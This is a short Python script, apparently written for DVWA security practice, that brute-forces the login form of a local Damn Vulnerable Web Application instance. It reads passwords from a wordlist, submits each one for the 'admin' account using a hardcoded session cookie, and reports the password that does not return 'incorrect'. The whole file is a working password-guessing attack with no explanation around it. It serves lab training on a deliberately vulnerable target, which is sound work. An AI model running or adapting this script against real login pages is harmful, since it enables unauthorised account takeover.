import requests

url = "http://localhost/dvwa/vulnerabilities/brute/index.php"
username = "admin"

file = open("list.txt","r")

for password in file.readlines():
    password = password.strip('\n')
    params = {'username':username, 'password':password, 'Login':'submit'}
    cookies = {'security':'low', 'PHPSESSID':'8acdc1b00f7f622d15bf59f33b5bcdc3'}

    send_url = requests.Session()
    page = send_url.get(url = url, params = params, cookies = cookies)

    print(page.content)

    if "incorrect" in str(page.content):
        print("Trying: "+password)
    else: 
        print("Found: "+password)
